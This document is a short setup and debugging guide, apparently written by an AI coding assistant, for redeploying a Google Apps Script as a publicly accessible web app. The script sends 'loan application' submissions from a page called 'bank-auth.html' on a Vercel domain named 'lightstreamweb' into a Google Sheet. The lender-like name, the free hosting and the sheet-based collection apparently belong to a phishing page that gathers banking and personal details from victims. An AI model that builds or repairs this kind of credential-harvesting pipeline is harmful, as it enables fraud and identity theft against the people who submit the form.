# GOOGLE SHEETS SETUP INSTRUCTIONS

## 🚨 IMMEDIATE ACTION REQUIRED

Your Google Sheets is not receiving data because your Google Apps Script needs to be updated.

## 📋 Step-by-Step Fix:

### 1. Update Your Google Apps Script
1. Go to: https://script.google.com/home
2. Open your existing project (the one with URL: AKfycbyFwPK0gH2Fk1KhEVZquyBKASRi40K3mBwtL4KJYIIf)
3. **DELETE ALL EXISTING CODE**
4. Copy the code from: `simple-google-sheets-script.js` 
5. **PASTE THE NEW CODE**
6. Click **Save**
7. Click **Deploy > New Deployment**
8. Set:
   - Description: "Updated script for loan applications"
   - Execute as: "Me"
   - Who has access: "Anyone"
9. Click **Deploy**
10. **Copy the new Web App URL** and replace the old one

### 2. Test the Connection
1. Go to: `https://lightstreamweb.vercel.app/bank-auth.html`
2. Click the **red "Test Google Sheets" button**
3. Check console for logs
4. Check your Google Sheet for test data

### 3. Common Issues & Solutions

**Issue: "No active spreadsheet found"**
- Solution: The script will create a new spreadsheet automatically

**Issue: "Permission denied"**
- Solution: Re-authorize the script when prompted

**Issue: "Web App URL not working"**
- Solution: Make sure you deployed as "Anyone" can access

## 🔍 Debugging Steps:

1. **Check Google Apps Script Logs:**
   - Go to your script project
   - Click "Executions" tab
   - Look for error messages

2. **Test with Console:**
   - Open bank-auth.html
   - Press F12 → Console
   - Click red test button
   - Look for detailed logs

## 📊 Expected Results:

**After fixing, you should see:**
- ✅ Test data in your Google Sheet
- ✅ Console logs showing success
- ✅ Real form submissions working

## 🚨 If Still Not Working:

1. **Verify Web App URL** is correct
2. **Check script permissions** are granted
3. **Ensure spreadsheet exists** or let script create one
4. **Test with simple data** first

## 📞 Need Help?

Share the console logs from the test button and I can identify the exact issue!
